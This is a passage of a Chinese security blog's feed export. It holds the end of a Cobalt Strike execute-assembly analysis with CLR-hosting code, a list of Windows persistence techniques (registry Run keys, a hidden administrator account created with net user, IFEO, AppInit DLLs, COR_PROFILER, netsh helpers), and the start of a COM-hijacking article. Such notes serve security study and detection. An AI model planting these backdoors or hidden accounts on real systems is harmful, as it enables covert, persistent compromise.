class="line">  SafeArrayLock(v14);</div><div class="line">  memmove(v14-&gt;pvData, a2, v3);</div><div class="line">  SafeArrayUnlock(v14);</div><div class="line">[.....]</div><div class="line"> <span class="built_in"> if </span>( v17 )</div><div class="line">    (*(*v17 + 16i64))(v17);</div><div class="line">  v17 = 0i64;</div><div class="line">  v9 = (*(*v15 + 360i64))(v15, v14, &amp;v17);</div><div class="line"> <span class="built_in"> if </span>( v9 &lt; 0 )</div><div class="line">  &#123;</div><div class="line">    v10 = <span class="string">"[-] Failed to load the assembly w/hr 0x%08lx\n"</span>;</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_5;</span></div><div class="line">  &#125;</div><div class="line">  v20 = v17;</div><div class="line"> <span class="built_in"> if </span>( v17 )</div><div class="line">    (*(*v17 + 8i64))(v17);</div><div class="line">[.....]</div><div class="line"> <span class="built_in"> if </span>( v17 )</div><div class="line">    result = (*(*v17 + 16i64))(v17);</div><div class="line"> <span class="built_in"> if </span>( v22 )</div><div class="line">    result = (*(*v22 + 16i64))(v22);</div><div class="line"> <span class="built_in"> if </span>( v18 )</div><div class="line">    result = ((*v18)[2])(v18);</div><div class="line"> <span class="built_in"> return </span>result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先初始化CLR环境，根据不同的版本采用不同的函数初始化CLR环境，<br>    <img src="http://hacky.wang/blog/20221008/vOqlGeHHW0Qb.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;启动CLR环境<br>    <img src="http://hacky.wang/blog/20221008/HWJnw2B9Csga.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取默认的程序域<br>    <img src="http://hacky.wang/blog/20221008/uqr4o9zaz4v5.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;加载assembly<br>    <img src="http://hacky.wang/blog/20221008/FxhAB2MGbTOw.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取入口点，并执行。<br>    <img src="http://hacky.wang/blog/20221008/Xrq72Vs8oyip.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;idiotc4t在<a href="https://idiotc4t.com/defense-evasion/cobaltstrike-executeassembly-realization" target="_blank" rel="external">Execute-Assembly实现</a>中仔细描述了如何编写一段内存加载.Net程序集。首先初始化CLR环境,CLR全称为公共语言运行库，即Common Language Runtime。CLR托管在进程中，是加载和运行.Net程序集的地方，关于CLR的概述可以参考<a href="https://learn.microsoft.com/en-us/dotnet/standard/clr" target="_blank" rel="external">微软关于CLR的描述</a>。常见的windows进程并不会加载CLR环境，可以使用ProcessExplorer或者ProcessHacker等工具查看是否加载CLR环境。加载CLR环境主要分四步:<br>    <img src="http://hacky.wang/blog/20221022/HLDiM7zQzzEN.png?imageslim" alt="mark"></p><ul><li>1) 调用CLRCreateInstance函数以实例化<code>ICLRMetaHost</code>或<code>ICLRMetaHostPolicy</code>接口，CLRCreateInstance函数原型如下，第一个参数为clsid，第二个参数是 riid，第三个参数是返回的接口。</li></ul><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function">HRESULT <span class="title">CLRCreateInstance</span>(<span class="params">  </span></span></div><div class="line"><span class="function"><span class="params">    [<span class="keyword">in</span>]  REFCLSID  clsid,  </span></span></div><div class="line"><span class="function"><span class="params">    [<span class="keyword">in</span>]  REFIID     riid,  </span></span></div><div class="line"><span class="function"><span class="params">    [<span class="keyword">out</span>] LPVOID  * ppInterface  </span></span></div><div class="line"><span class="function"><span class="params"></span>)</span>;</div></pre></td></tr></table></figure><ul><li><p>2) 调用<code>ICLRMetaHost::EnumerateInstalledRuntimes</code>, <code>ICLRMetaHost::GetRuntime</code>或者<code>ICLRMetaHostPolicy::GetRequestedRuntime</code>方法以获取有效的ICLRRuntimeInfo指针。以<code>ICLRMetaHost::GetRuntime</code>为例，第一个参数为pwzVersion，表示 .NET Framework 的版本，riid为标识符，此参数的唯一有效值是 IID_ICLRRuntimeInfo。第三个参数是返回的ICLRRuntimeInfo接口的指针。</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">HRESULT GetRuntime (  </div><div class="line">    [<span class="keyword">in</span>] LPCWSTR pwzVersion,  </div><div class="line">    [<span class="keyword">in</span>] REFIID riid,  </div><div class="line">    [<span class="keyword">out</span>,iid<span class="number">_</span><span class="keyword">is</span>(riid), retval] LPVOID *ppRuntime  </div><div class="line">);</div></pre></td></tr></table></figure></li><li><p>3) 调用<code>GetInterface</code>获取<code>ICorRuntimeHost</code>或者<code>ICLRRuntimeHost</code>。rclsid为接口的CLSID,riid是接口的iid，ppUnk返回的接口的指针。加载.Net程序集可以使用两种接口<code>ICorRuntimeHost</code>或者<code>ICLRRuntimeHost</code>。使用<code>ICorRuntimeHost</code>的有点是可以兼容V1.0的程序集，但是<code>ICLRRuntimeHost</code>在代码实现上会比较容易。</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">HRESULT GetInterface(  </div><div class="line">[<span class="keyword">in</span>]  REFCLSID rclsid,  </div><div class="line">[<span class="keyword">in</span>]  REFIID   riid,  </div><div class="line">[<span class="keyword">out</span>, iid<span class="number">_</span><span class="keyword">is</span>(riid), retval] LPVOID *ppUnk);</div></pre></td></tr></table></figure></li><li><p>4）启动CLR环境集</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">CLRCreateInstance(<span class="name">CLSID_CLRMetaHost</span>, IID_ICLRMetaHost, (<span class="name">VOID**</span>)<span class="symbol">&amp;iMetaHost</span>)<span class="comment">;</span></div><div class="line">iMetaHost-&gt;GetRuntime(<span class="name">L</span><span class="string">"v4.0.30319"</span>, IID_ICLRRuntimeInfo, (<span class="name">VOID**</span>)<span class="symbol">&amp;iRuntimeInfo</span>)<span class="comment">;</span></div><div class="line">iRuntimeInfo-&gt;GetInterface(<span class="name">CLSID_CorRuntimeHost</span>, IID_ICorRuntimeHost, (<span class="name">VOID**</span>)<span class="symbol">&amp;iRuntimeHost</span>)<span class="comment">;</span></div><div class="line">iRuntimeHost-&gt;Start()<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序域为安全性、可靠性和版本控制以及卸载程序集提供了隔离边界，需要将程序集加载到对应的程序域中，才能执行其中包含的代码，这也就是为啥要获取程序集的原因了。程序集的加载方式决定了它的即时 (JIT) 编译代码是否可以由进程中的多个应用程序域共享，以及程序集是否可以从进程中卸载。具体关于程序域和程序集可以参考<a href="https://learn.microsoft.com/en-us/dotnet/framework/app-domains/application-domains" target="_blank" rel="external">微软关于程序域和程序集的概述</a>，通过调用<code>GetDefaultDomain</code>获取默认的程序集，并通过调用<code>QueryInterface</code>检索该程序集的接口。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iRuntimeHost-&gt;GetDefaultDomain(<span class="name">&amp;pAppDomain</span>)<span class="comment">;</span></div><div class="line">pAppDomain-&gt;QueryInterface(<span class="name">__uuidof</span>(<span class="name">_AppDomain</span>), (<span class="name">VOID**</span>)<span class="symbol">&amp;pDefaultAppDomain</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在拥有运行时环境CLR，已经可以被托管的容器程序域之后，可以加载程序集了。调用<code>Load_3</code>函数加载程序集安全数组，并获取入口点。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">HRESULT Load_3 (</div><div class="line">    SAFEARRAY* rawAssembly,</div><div class="line">    Assembly **pRetVal )</div><div class="line"></div><div class="line">pDefaultAppDomain-&gt;Load_3(<span class="name">pSafeArray</span>, <span class="symbol">&amp;pAssembly</span>)<span class="comment">;</span></div><div class="line">pAssembly-&gt;get_EntryPoint(<span class="name">&amp;pMethodInfo</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后，调用Invoke_3执行程序集的入口点。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HRESULT hr = pMethodInfo-&gt;Invoke_3(<span class="name">vObj</span>, args, <span class="symbol">&amp;vRet</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p><h2 id="0x09-参考"><a href="#0x09-参考" class="headerlink" title="0x09 参考"></a>0x09 参考</h2><ul><li><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm" target="_blank" rel="external">官方文档-Beacon Object Files</a></li><li><a href="https://www.trustedsec.com/blog/a-developers-introduction-to-beacon-object-files/" target="_blank" rel="external">A DEVELOPER’S INTRODUCTION TO BEACON OBJECT FILES</a></li><li><a href="https://www.freebuf.com/articles/network/282744.html" target="_blank" rel="external">CobaltStirke BOF技术剖析（一）｜BOF实现源码级分析</a></li><li><a href="https://idiotc4t.com/weaponization/bof-weaponization" target="_blank" rel="external">https://idiotc4t.com/weaponization/bof-weaponization</a></li><li><a href="https://idiotc4t.com/defense-evasion/cobaltstrike-executeassembly-realization" target="_blank" rel="external">Execute-Assembly实现</a></li><li><a href="https://3gstudent.github.io/从内存加载.NET程序集(execute-assembly" target="_blank" rel="external">从内存加载.NET程序集的利用分析</a>的利用分析)</li><li><a href="https://learn.microsoft.com/en-us/dotnet/standard/clr" target="_blank" rel="external">微软关于CLR的描述</a></li><li><a href="https://learn.microsoft.com/en-us/dotnet/framework/app-domains/application-domains" target="_blank" rel="external">微软关于程序域和程序集的概述</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;本文首发于跳跳糖安全社区&lt;a href=&quot;https://tttang.com/archive/1786/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://tttang.com/archive/1786/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>Persistence</title>
    <link href="https://findream.github.io/2022/11/08/%E6%8C%81%E4%B9%85%E5%8C%96%E6%80%BB%E7%BB%93/"/>
    <id>https://findream.github.io/2022/11/08/持久化总结/</id>
    <published>2022-11-08T07:02:11.000Z</published>
    <updated>2022-11-12T07:30:26.217Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Persistence学习总结<a id="more"></a></li></ul><h2 id="0x01-WLL加载项"><a href="#0x01-WLL加载项" class="headerlink" title="0x01 WLL加载项"></a>0x01 WLL加载项</h2><ul><li>%AppData%\Microsoft\Word\STARTUP</li></ul><h2 id="0x02-XLL加载项"><a href="#0x02-XLL加载项" class="headerlink" title="0x02 XLL加载项"></a>0x02 XLL加载项</h2><ul><li>保存在%AppData%\Microsoft\AddIns</li><li>XLL文件导出函数名必须为”xlAutoOpen”</li><li>HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Excel\Options “OPEN”属性，值为”/ R 任意文件名.xll”</li></ul><h2 id="0x03-WORD-VBA模板"><a href="#0x03-WORD-VBA模板" class="headerlink" title="0x03 WORD VBA模板"></a>0x03 WORD VBA模板</h2><ul><li>保存路径为%AppData%\Microsoft\Templates</li></ul><h2 id="0x04-Execel-VBA模板"><a href="#0x04-Execel-VBA模板" class="headerlink" title="0x04 Execel VBA模板"></a>0x04 Execel VBA模板</h2><ul><li>文件格式为”.xla”或者”.xlam”格式</li><li>保存路径为%appdata%\Microsoft\Excel\XLSTART </li></ul><h2 id="0x05-PowerPoint-VBA模板"><a href="#0x05-PowerPoint-VBA模板" class="headerlink" title="0x05 PowerPoint VBA模板"></a>0x05 PowerPoint VBA模板</h2><ul><li>文件格式为”.ppam”或”.ppa”</li><li>保存位置为%appdata%\Microsoft\AddIns</li><li>设置注册表HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\PowerPoint\AddIns\&lt;任意名字&gt;</li><li>新建DWORD值 名字为”Autoload”, 值为1</li><li>新建String值，名字为”Path”, 值为文件路径</li></ul><h2 id="0x06-Office-test"><a href="#0x06-Office-test" class="headerlink" title="0x06 Office test"></a>0x06 Office test</h2><ul><li>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</li><li>新建默认名称(Default)的Key，值为文件路径</li></ul><h2 id="0x07-针对Word-Hunt-思路"><a href="#0x07-针对Word-Hunt-思路" class="headerlink" title="0x07 针对Word Hunt 思路"></a>0x07 针对Word Hunt 思路</h2><ul><li><ol><li>ProcessMonitor操作设置为”IRP_MJ_DIRECTORY_CONTROL”,结果设置为”NO SUCH FILE” 可以Hunt到诸如<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\M</span>icrosoft Office<span class="symbol">\r</span>oot<span class="symbol">\V</span>FS<span class="symbol">\S</span>ystemX86<span class="symbol">\E</span>hStorShell.dll"</div><div class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\M</span>icrosoft Office<span class="symbol">\r</span>oot<span class="symbol">\V</span>FS<span class="symbol">\S</span>ystemX86<span class="symbol">\n</span>tshrui.dll"</div></pre></td></tr></table></figure></li></ol></li><li><ol><li>ProcessMonitor操作设置为”RegQueryValue” ,结果设置为”NAME NOT FOUND”,路径起始设置为”HKCU\Software\Microsoft\Office”,可以Hunt到如<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HKCU<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\O</span>ffice<span class="symbol">\1</span>6.0<span class="symbol">\W</span>ord<span class="symbol">\O</span>ptions<span class="symbol">\S</span>TARTUP-PATH</div></pre></td></tr></table></figure></li></ol></li></ul><h2 id="COM劫持思路"><a href="#COM劫持思路" class="headerlink" title="COM劫持思路"></a>COM劫持思路</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="string">[1]</span> 增加缺少的CLSID的路径</div><div class="line"><span class="string">[2]</span> 修改原有的CLSID加载的程序</div><div class="line"><span class="string">[3]</span> 修改原有的CLSID加载的路径</div></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://3gstudent.github.io/Use-Office-to-maintain-persistence" target="_blank" rel="external">https://3gstudent.github.io/Use-Office-to-maintain-persistence</a></li><li><a href="https://cloud.tencent.com/developer/article/1819454" target="_blank" rel="external">https://cloud.tencent.com/developer/article/1819454</a></li></ul><h2 id="常见持久化技术简介"><a href="#常见持久化技术简介" class="headerlink" title="常见持久化技术简介"></a>常见持久化技术简介</h2><ul><li><p>利用启动项(文件目录)实现持久化</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:<span class="symbol">\P</span>rogramData<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\S</span>tart Menu<span class="symbol">\P</span>rograms<span class="symbol">\S</span>tartUp</div><div class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\[</span>Username]<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\S</span>tart Menu<span class="symbol">\P</span>rograms<span class="symbol">\S</span>tartup</div></pre></td></tr></table></figure></li><li><p>利用启动项(注册表)实现持久化</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[1] HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</div><div class="line">[2] HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</div><div class="line">[3] HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnceEx</div><div class="line">[4] HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\E</span>xplorer<span class="symbol">\U</span>ser Shell Folders</div><div class="line">[...]</div></pre></td></tr></table></figure></li><li><p>利用Windows服务实现持久化</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>] <span class="keyword">sc </span>create servicename <span class="keyword">binpath </span>...</div></pre></td></tr></table></figure></li><li><p>利用计划任务实现</p><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-attr">[1]</span> <span class="selector-tag">schtasks</span> /<span class="selector-tag">create</span> ...</div><div class="line"><span class="selector-attr">[2]</span> 利用<span class="selector-tag">C</span>++ <span class="selector-tag">COM</span>组件实现 </div><div class="line"><span class="selector-attr">[3]</span> <span class="selector-tag">Ref</span>:<span class="selector-attr">[VC++创建计划任务的若干方式]</span> <span class="selector-tag">https</span>:<span class="comment">//blog.csdn.net/chantsky/article/details/82904942</span></div></pre></td></tr></table></figure></li><li><p>利用BITS实现</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="string">[1]</span> 后台智能传输服务</div><div class="line"><span class="string">[2]</span> bitsadmin /create</div></pre></td></tr></table></figure></li><li><p>LSA 身份认证包</p><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-attr">[1]</span> 系统启动中，本地安全机构(LSA)会启动<span class="selector-tag">LSA</span>身份认证包<span class="selector-tag">DLL</span></div><div class="line"><span class="selector-attr">[2]</span></div></pre></td></tr></table></figure></li><li><p>用户登入初始化程序</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[1] windows 登录之时，winlogon.exe进程会依赖注册表加载和执行.dll文件和.exe文件。</div><div class="line">[2] HKCU<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inlogon<span class="symbol">\W</span>inlogon<span class="symbol">\U</span>serinit  用户登录时执行的用户初始化程序</div><div class="line">[3] HKCU<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inlogon<span class="symbol">\W</span>inlogon<span class="symbol">\S</span>hell 用户登录时执行的系统 shell</div><div class="line">[4] HKCU<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inlogon<span class="symbol">\N</span>otify 处理 Winlogon 事件的通知包 DLL</div></pre></td></tr></table></figure></li><li><p>登录脚本</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>] windows 允许在登录到系统之时运行脚本</div><div class="line">[<span class="number">2</span>] 在`HKCU\Environment`下新建名为 `UserInitMprLogonScript`的项，值为程序路径</div></pre></td></tr></table></figure></li><li><p>影子账户</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[1] 新建用户net<span class="built_in"> user </span>username1$ password1 /add</div><div class="line">[2] 添加到管理员组net localgroup administrators username1$ /add</div></pre></td></tr></table></figure></li><li><p>修改默认文件关联</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>] 先在`HKEY_CLASS_ROOT`寻找目标的文件格式</div><div class="line">[<span class="number">2</span>] 然后在`HKCR\[filetype]\shell\open\command`的默认项中添加路径</div></pre></td></tr></table></figure></li><li><p>设置屏幕保护程序</p></li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>] 在HKEY_CURRENT_USER\Control Panel\Desktop下添加</div><div class="line">[<span class="number">2</span>] SCRNSAVE.EXE：路径</div><div class="line">[<span class="number">3</span>] ScreenSaveActive - <span class="number">1</span>表示屏幕保护是启动状态，<span class="number">0</span>表示表示屏幕保护是关闭状态</div><div class="line">[<span class="number">4</span>] ScreenSaverTimeout - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为<span class="number">900</span></div><div class="line">``` </div><div class="line"></div><div class="line">* WMI事件订阅</div></pre></td></tr></table></figure><p>[1] EventFilter 事件筛选器<br>[2] EventConsumer 事件消费者<br>[3] FilterToConsumerBinding 绑定关系<br>[4] 注:微软文档有错误，所以导致一众大佬复现不了<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>辅助功能(Shift后门)</div></pre></td></tr></table></figure></p><p>[1] 貌似windows xp 可以直接使用<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>AppCert DLL</div></pre></td></tr></table></figure></p><p>[1] 只要进程中调用CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW和WinExec函数，就会依据<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\</code>加载所记录的dll文件<br>[2] 在默认键值下添加路径即可<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>AppInit DLL</div></pre></td></tr></table></figure></p><p>[1] 和AppCert DLL 差不多，进程只需要加载user32.dll模块，即可从<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code>和<code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code>中加载指定的模块<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>映像劫持</div></pre></td></tr></table></figure></p><p>[1] HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">* DLL劫持</div></pre></td></tr></table></figure></executable></p><p>[1] DLLs搜索顺序劫持<br>[2] DLL侧加载<br>[3] PATH环境变量劫持<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>COR<span class="emphasis">_PROFILER劫持</span></div></pre></td></tr></table></figure></p><p>SETX COR_ENABLE_PROFILING = 1<br>SETX COR_PROFILER = CLSID<br>SETX COR_PROFILER_PATH= dllpath<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>Netsh helper</div></pre></td></tr></table></figure></p><p>[1] 添加helper方法1 ：netsh add helper test.dll<br>[2] 添加helper方法2 : HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh 下新建键为helper名字，值为路径<br>```</p>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;Persistence学习总结
    
    </summary>
    
      <category term="安全" scheme="https://findream.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>从COM劫持到COR_PROFILE</title>
    <link href="https://findream.github.io/2022/09/05/%E4%BB%8ECOM%E5%8A%AB%E6%8C%81%E5%88%B0COR_PROFILE/"/>
    <id>https://findream.github.io/2022/09/05/从COM劫持到COR_PROFILE/</id>
    <published>2022-09-05T07:02:11.000Z</published>
    <updated>2022-11-12T06:57:41.551Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在ATT&amp;CK框架中，持久性方面，攻击者使用计划任务，或者服务作为持久性的相关技术，但很少看到编号为T1546.015的COM组件劫持相关的利用。本文行文仓促，如有错误，请各位积极指正。</p><a id="more"></a><h2 id="0x01-COM劫持"><a href="#0x01-COM劫持" class="headerlink" title="0x01 COM劫持"></a>0x01 COM劫持</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;COM劫持是一种通过劫持COM引用和关系的一种持久性手段，COM劫持是通过修改注册表相关内容来实现替换合法COM组件的引用。</p><h3 id="0x1-1-COM模型"><a href="#0x1-1-COM模型" class="headerlink" title="0x1.1 COM模型"></a>0x1.1 COM模型</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Component Object Model 译为组件对象模型，是一种独立于语言的一种二进制操作模型，攻击者通常使用组件对象模型(即COM)来执行本地代码。由于COM组件是语言独立的。所以，这些接口经常通过各种语言调用来进行代码执行，以及无文件下载以及持久性等诸多隐秘的操作，而被滥用。通常通过指定CLSID（标识GUID）或ProgID（程序标识符）来获得COM对象。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在0x01 COM劫持一节中，简略的介绍了COM劫持的基本原理，即通过修改注册表相关内容来实现替换合法COM组件的引用。因为COM都通过CLSID标识，这些CLSID数据大多存储在注册表<code>HKEY_CLASSES_ROOT\CLSID</code>,<code>HKEY_CURRENT_USER\Software\Classes\CLSID</code>,以及<code>HKEY_LOCAL_MACHINE\Software\Classes\CLSID</code>中。在CLSID中，和COM劫持相关的键主要有<code>InprocServer32</code>和<code>LocalServer32</code>。所以，从狭义上来说，COM劫持主要是通过修改<code>InprocServer32</code>和<code>LocalServer32</code>的值来实现的。<br>   <img src="http://hacky.wang/blog/20210920/P43NEgPNW9EL.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InprocServer32主要存储的是一个*.dll的路径，当实例化一个COM后，就会将InprocServer32存储对的Dll文件加载入实例化该COM的进程中，而LocalServer32存储的是一个.exe的路径，当实例化COM之后，便会以一个进程形式存在。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当查询CLSID的时候，windows首先会查找<code>HKEY_CURRENT_USER\Software\Classes\CLSID</code>存储的CLSID，当该键不存在的情况下，也会依次查询<code>HKEY_CLASSES_ROOT\CLSID</code>和<code>HKEY_LOCAL_MACHINE\Software\Classes\CLSID</code>。<br>  <img src="http://hacky.wang/blog/20210920/k6qYbCXnNJvB.png?imageslim" alt="mark"></p><h3 id="0x1-2-Hunting-COM"><a href="#0x1-2-Hunting-COM" class="headerlink" title="0x1.2 Hunting COM"></a>0x1.2 Hunting COM</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在0x1.1中，简单的介绍了COM劫持的基本原理，现在的问题是如何寻找可以被利用的COM?一般的搜索COM有以下三个原则：</p><ul><li>增加缺少的CLSID的路径</li><li>修改原有的CLSID加载的程序</li><li>修改原有的CLSID加载的路径</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<a href="https://pentestlab.blog/2020/05/20/persistence-com-hijacking/" target="_blank" rel="external">Persistence – COM 